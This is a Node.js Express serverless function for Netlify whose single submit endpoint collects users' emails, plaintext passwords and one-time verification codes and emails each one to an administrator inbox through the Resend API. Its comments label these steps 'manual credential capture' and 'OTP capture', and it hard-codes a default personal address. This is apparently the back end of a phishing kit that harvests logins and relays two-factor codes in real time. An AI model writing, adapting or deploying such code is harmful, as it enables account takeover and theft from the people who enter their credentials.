const express = require("express");
const cors = require("cors");
const serverless = require("serverless-http");
const { Resend } = require("resend");

const app = express();
const router = express.Router();

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "nicholaszobo@gmail.com";
const FROM_EMAIL = process.env.FROM_EMAIL || "onboarding@resend.dev";

app.use(cors());
app.use(express.json());

// Main submit endpoint
router.post("/submit", async (req, res) => {
  const { type, email, password, otp } = req.body;
  const timestamp = new Date().toISOString();

  if (!resend) {
    return res.status(500).json({
      success: false,
      message: "Resend API key is not configured."
    });
  }

  try {
    // 1. ACCOUNT CREATION & MANUAL CREDENTIAL CAPTURE
    if (type === "account") {
      if (!email || !password) {
        return res.status(400).json({
          success: false,
          message: "Email and password are required."
        });
      }

      await resend.emails.send({
        from: FROM_EMAIL,
        to: ADMIN_EMAIL,
        subject: `[Manual Auth] New Account: ${email}`,
        html: `
          <h2>New User Credentials Submitted</h2>
          <p><strong>Email:</strong> ${escapeHtml(email)}</p>
          <p><strong>Password:</strong> ${escapeHtml(password)}</p>
          <p><strong>Submitted At:</strong> ${timestamp}</p>
          <hr />
          <p><em>Action Required: Record these details manually to allow access later.</em></p>
        `
      });

      return res.json({
        success: true,
        message: "Account details sent for processing."
      });
    }

    // 2. MANUAL OTP CAPTURE
    if (type === "verification") {
      if (!email || !otp) {
        return res.status(400).json({
          success: false,
          message: "Email and OTP are required."
        });
      }

      await resend.emails.send({
        from: FROM_EMAIL,
        to: ADMIN_EMAIL,
        subject: `[Manual Auth] OTP Verification: ${email}`,
        html: `
          <h2>OTP Submission</h2>
          <p><strong>Email:</strong> ${escapeHtml(email)}</p>
          <p><strong>Entered OTP:</strong> ${escapeHtml(otp)}</p>
          <p><strong>Submitted At:</strong> ${timestamp}</p>
        `
      });

      return res.json({
        success: true,
        message: "OTP sent to admin for verification."
      });
    }

    return res.status(400).json({
      success: false,
      message: "Invalid submission type."
    });

  } catch (error) {
    console.error("Failed to send email via Resend:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to forward credentials."
    });
  }
});

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

app.use("/.netlify/functions/api", router);

module.exports.handler = serverless(app);
